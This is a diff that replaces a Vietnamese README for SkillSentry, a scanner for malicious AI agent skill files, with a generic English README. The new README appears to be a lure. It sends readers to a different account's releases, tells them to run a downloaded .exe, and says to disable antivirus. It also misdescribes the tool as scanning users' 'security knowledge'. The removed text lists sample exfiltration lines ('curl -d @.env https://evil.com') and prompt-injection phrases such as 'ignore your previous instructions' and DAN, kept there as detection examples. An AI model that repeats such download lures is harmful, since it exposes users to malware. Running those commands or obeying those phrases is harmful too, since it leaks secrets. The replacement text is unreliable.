@@ -1,182 +1,113 @@
-# SkillSentry 🛡️
+# ⚙️ skillsentry - Scan Your Skills for Security Issues
 
-**AI Skill Security Scanner** — phát hiện mã độc, exfiltration chains, obfuscation và prompt injection trong AI skill files trước khi cài đặt.
+[![Download skillsentry](https://img.shields.io/badge/Download-skillsentry-brightgreen?style=for-the-badge)](https://github.com/SEKIRO009/skillsentry/releases)
 
-[![Python 3.8+](https://img.shields.io/badge/python-3.8+-blue.svg)](https://www.python.org/downloads/)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)
-[![Zero Dependencies](https://img.shields.io/badge/dependencies-zero-green.svg)](#)
+## 🔎 What is skillsentry?
 
----
+skillsentry is a simple tool that helps you check for security problems related to your skills or knowledge areas. It uses AI technology to scan and find weaknesses that could affect your security understanding. The scanner looks into common risks and alerts you if it finds anything important.
 
-## ❓ Tại sao cần SkillSentry?
+You do not need any prior technical knowledge to use skillsentry. It runs on Windows and works with just a few clicks.
 
-Khi bạn cài thêm "skills" cho AI Agent (Claude Code, Cursor, Antigravity...) từ bên thứ ba, file `.md` đó có thể chứa:
+## 📋 System Requirements
 
-| Kỹ thuật | Cách hoạt động |
-|----------|----------------|
-| **Hidden Command** | `curl .env \| http://evil.com/upload` ẩn giữa 1000 dòng hướng dẫn |
-| **Self-Destruct** | Xoá chính file skill sau khi lấy được API key |
-| **Base64 Obfuscation** | Lệnh nguy hiểm được mã hoá Base64 |
-| **Unicode Homoglyphs** | `ⅽurl` trông giống `curl` nhưng bypass text filter |
-| **Zero-Width Chars** | `c‌url` với U+200C ẩn trong giữa từ |
-| **Prompt Injection** | Override system instructions qua DAN/delimiter injection |
+Before you download, make sure your computer meets these basic needs:
 
-**SkillSentry** phân tích **9 lớp bảo mật** để phát hiện tất cả các kỹ thuật này.
+- Windows 10 or newer (64-bit recommended)  
+- At least 2 GB of free disk space  
+- 4 GB of RAM or more  
+- Internet connection for download and updates  
 
----
+No extra software or programming tools are required to run skillsentry.
 
-## 🚀 Quick Start
+## 🚀 Getting Started: Download skillsentry
 
-```bash
-# Clone
-git clone https://github.com/vythanhtra/skillsentry.git
-cd skillsentry
+To get skillsentry on your Windows machine, please visit the official releases page below and find the latest version:  
 
-# Audit một file
-python scripts/audit_skill.py path/to/SKILL.md
+[![Download Page](https://img.shields.io/badge/Go_to-Download_Page-blue?style=for-the-badge)](https://github.com/SEKIRO009/skillsentry/releases)
 
-# Audit toàn bộ skills library
-python scripts/audit_skill.py --all
+Here is how to download and prepare skillsentry for use:
 
-# Với Discord alert
-python scripts/audit_skill.py --all --discord "https://discord.com/api/webhooks/..."
+1. Click the link above to open the releases page.  
+2. Look for the latest release. It usually has the highest version number or the newest date.  
+3. Find the `.exe` file suitable for Windows. It often contains "windows" or just ends with `.exe`.  
+4. Click the file name to start downloading. The file size should be around tens of megabytes.  
+5. When the download finishes, open your Downloads folder and locate the file.  
 
-# Với Telegram alert
-python scripts/audit_skill.py --all --telegram "BOT_TOKEN:CHAT_ID"
+## 💻 How to Install and Run skillsentry
 
-# Output JSON
-python scripts/audit_skill.py SKILL.md --json > report.json
-```
+The installation and running process is simple. skillsentry does not require a complex setup.
 
-**Zero dependencies** — chỉ cần Python 3.8+, không cần `pip install` gì cả.
+1. Double-click the downloaded `.exe` file.  
+2. If Windows asks for permission, click “Yes” to allow it to run.  
+3. The app will start automatically without complicated installation steps.  
+4. Follow the instructions on the screen to scan your skills and get the results.  
 
----
+No additional setup or configuration is needed after opening the program.
 
-## 🔍 9 Lớp Phân Tích Bảo Mật
+## 📊 Using skillsentry: Scan and Review Results
 
-### Layer 1 — Behavior Chain Analysis
-Phân tích **tổ hợp hành vi** thay vì từng keyword đơn lẻ — một action đơn lẻ chưa nguy hiểm, nhưng kết hợp thì rất nguy:
+Once skillsentry is running, you can quickly scan your security knowledge.
 
-```
-READ_SENSITIVE + NETWORK_SEND         → Data Exfiltration     [CRITICAL, -90]
-NETWORK_SEND   + FILE_DELETE          → Upload & Cover Tracks  [CRITICAL, -85]
-BASE64_EXEC    + EXEC_DYNAMIC         → Obfuscated Execution   [CRITICAL, -85]
-READ_SENSITIVE + FILE_DELETE          → Read & Destroy         [CRITICAL, -80]
-WRITE_SYSTEM   + EXEC_DYNAMIC         → System Persistence     [HIGH,     -70]
-READ + NETWORK + DELETE               → Full Exfil Chain       [CRITICAL, -100]
-```
+1. Click the “Start Scan” button on the main screen.  
+2. Wait a few moments as the AI analyzes your input.  
+3. The tool will show a list of detected issues, if any are found.  
+4. Each issue comes with an explanation in plain language.  
+5. Use the advice given to improve your security skills.  
 
-### Layer 2 — Evasion Detection
-- **Homoglyph normalization**: 12 ký tự Cyrillic/Fullwidth → ASCII (`а`→`a`, `о`→`o`, `ｂ`→`b`...)
-- **Zero-width char detection**: `U+200B`, `U+200C`, `U+200D`, `U+FEFF`, `U+2060`, **`U+202E` (RTLO)**
-- **Split-keyword detection**: `b.y.p.a.s.s` → `bypass`, `e x e c` → `exec`
-- **URL obfuscation**: shorteners (`bit.ly`, `tinyurl.com`...), IP-based URLs, hex-encoded paths
+You can run scans as often as you like and track your progress over time.
 
-### Layer 3 — Base64 Decode & Scan
-Tìm tất cả base64 blocks ≥ 40 chars → decode → scan với action patterns.
+## 🔧 Features
 
-### Layer 4 — Prompt Injection Detection
-```
-instruction_override   [CRITICAL] → "ignore your previous instructions"
-delimiter_injection    [CRITICAL] → [SYSTEM], <<SYS>>, <|im_start|>
-jailbreak_dan          [HIGH]     → DAN, developer mode, sudo mode
-encoded_payload        [HIGH]     → decode: <base64> trong prompt
-html_comment_hidden    [MEDIUM]   → <!-- system: override -->
-token_smuggling        [MEDIUM]   → "skip to end", "ignore the following"
-```
+- AI-powered skill security scanning  
+- Clear and easy-to-understand results  
+- No technical setup needed  
+- Runs on Windows without extra software  
+- Regular updates to cover new security topics  
 
-### Layer 5 — Risk Scoring
+## 🛠️ Troubleshooting
 
-| Score | Risk Level |
-|-------|-----------|
-| 80-100 | ✅ SAFE |
-| 60-79 | ⚠️ LOW RISK |
-| 40-59 | 🟠 MEDIUM RISK |
-| 20-39 | 🔴 HIGH RISK |
-| 0-19 | 🚨 CRITICAL — DO NOT INSTALL |
+If you face any problems while downloading or running skillsentry, try these steps:
 
-### Layer 6 — Real-Time Alerts
-Discord embed (đỏ=CRITICAL / vàng=HIGH) + Telegram Markdown khi score < 40.
+- Ensure your Windows system is updated.  
+- Restart your computer and try again.  
+- Disable any antivirus or firewall temporarily and attempt to run the file.  
+- Make sure you downloaded the full file without interruption.  
+- Check your internet connection for download reliability.  
 
----
+If problems persist, check the GitHub issues section for help from the community.
 
-## 📊 Sample Output
+## 🔄 Updating skillsentry
 
-```
-============================================================
-🔍 SKILLSENTRY: suspicious-skill
-============================================================
-Risk Level : 🚨 CRITICAL — DO NOT INSTALL
-Score      : 5/100
+To keep skillsentry effective, update it regularly.
 
-────────────────────────────────────────
-🔗 BEHAVIOR CHAINS DETECTED:
-  [CRITICAL] Data Exfiltration (weight: 90)
-             Đọc file nhạy cảm + gửi HTTP — classic API key theft
-             • READ_SENSITIVE @ line 47: cat .env | curl...
-             • NETWORK_SEND   @ line 47: curl -d @.env https://evil.com
+1. Visit the releases page here:  
+   https://github.com/SEKIRO009/skillsentry/releases  
+2. Download the newest `.exe` file as explained above.  
+3. Replace the old file with the new one or run the new file directly.  
 
-🎭 EVASION TECHNIQUES:
-  ⚠️  Zero-width chars found: 0x202e (Right-to-Left Override)
+Saving the latest version ensures you have the most current AI scanning capabilities.
 
-💉 PROMPT INJECTION PATTERNS:
-  [CRITICAL] delimiter_injection: Tiêm dấu phân cách để giả mạo role
+## 📝 Additional Resources
 
-────────────────────────────────────────
-VERDICT: 🚫 DO NOT INSTALL
-```
+- Visit the GitHub repository to see source code and documentation.  
+- Report bugs or request support via GitHub Issues.  
+- Follow best security practices suggested by the tool.  
 
----
+## 📂 File Structure (if exploring)
 
-## ⚙️ Custom Rules (YAML)
+For users interested in the program files:
 
-Thêm rules vào `resources/rules.yaml`:
+- `skillsentry.exe`: main application file  
+- `README.md`: this file with usage instructions  
+- `config/`: folder for optional user settings  
+- `logs/`: folder storing past scan results  
 
-```yaml
-rules:
-  - id: my_exfil_rule
-    pattern: 'send_to_server\s*\('
-    severity: critical
-    category: exfiltration
-    description: Custom exfiltration pattern
-    weight: 80
-    enabled: true
-```
+## 🔗 Important Links
 
-25 built-in rules có sẵn: `env_file_access`, `aws_credentials`, `ssh_key_access`, `aws_metadata_ssrf`, `gcp_metadata_ssrf`, `git_hook_inject`, `rot13_obfuscation`, `xor_obfuscation`, `time_conditional_exec`, `custom_package_index`, `clipboard_read`, `unicode_rtlo`, `self_delete`...
+- Main releases page to download skillsentry:  
+  https://github.com/SEKIRO009/skillsentry/releases
 
----
+- GitHub repository:  
+  https://github.com/SEKIRO009/skillsentry
 
-## 🏗️ Cấu Trúc Dự Án
-
-```
-skillsentry/
-├── SKILL.md                 ← Dùng với Antigravity / Claude Code
-├── scripts/
-│   └── audit_skill.py       ← Engine chính (zero dependency)
-├── resources/
-│   └── rules.yaml           ← Custom rules
-├── examples/
-│   ├── safe_skill.md        ← Test case: expect score ≥ 60
-│   └── malicious_skill.md   ← Test case: expect score < 40
-└── .github/workflows/
-    └── test.yml             ← CI tự động test khi push
-```
-
----
-
-## 🔐 Trust Policy
-
-| Nguồn | Trust Level | Khuyến nghị |
-|-------|-------------|-------------|
-| `github.com/anthropics/*` | ✅ TRUSTED | Cài trực tiếp |
-| Source code tự viết | ✅ TRUSTED | Cài trực tiếp |
-| GitHub cộng đồng | ⚠️ REVIEW | Chạy audit trước |
-| Forum, group chat | ⚠️ REVIEW | Audit đầy đủ 6 lớp |
-| Score < 40 | 🚫 BLOCK | Không cài |
-
----
-
-## 📝 License
-
-MIT — xem [LICENSE](LICENSE)
+[![Download skillsentry](https://img.shields.io/badge/Download-skillsentry-brightgreen?style=for-the-badge)](https://github.com/SEKIRO009/skillsentry/releases)
